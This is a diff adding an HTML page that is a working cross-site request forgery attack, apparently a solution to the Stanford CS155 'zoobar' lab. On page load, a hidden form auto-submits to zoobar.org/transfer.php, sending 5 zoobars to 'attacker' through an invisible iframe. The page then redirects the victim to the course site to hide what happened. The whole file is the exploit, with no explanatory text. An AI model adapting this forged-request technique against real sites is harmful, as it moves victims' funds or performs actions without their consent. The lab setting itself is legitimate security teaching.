@@ -1,0 +1,29 @@
+<html>
+<head>
+<title>My Site</title>
+</head>
+<body>
+
+<form method="POST" id="my_form" name="transferform"
+  action="http://zoobar.org/transfer.php" target="my_frame" style="visibility:hidden">
+<p>Send <input name=zoobars type=text value="5" size=5> zoobars</p>
+<p>to <input name=recipient type=text value="attacker"></p>
+<input type=submit name=submission value="Send">
+</form>
+
+<script type="text/javascript">
+	window.onload = onload_handler;
+  	function onload_handler(){
+		document.getElementById("frame_id").addEventListener("load",frame_handler,false);
+    	setTimeout('document.transferform.submission.click()', 100);
+  	} 
+	
+	function frame_handler(){
+		window.location.href = "http://crypto.stanford.edu/cs155";	
+	}
+</script>
+
+<iframe name="my_frame" id="frame_id" style="visibility:hidden">
+</iframe>
+</body>
+</html>
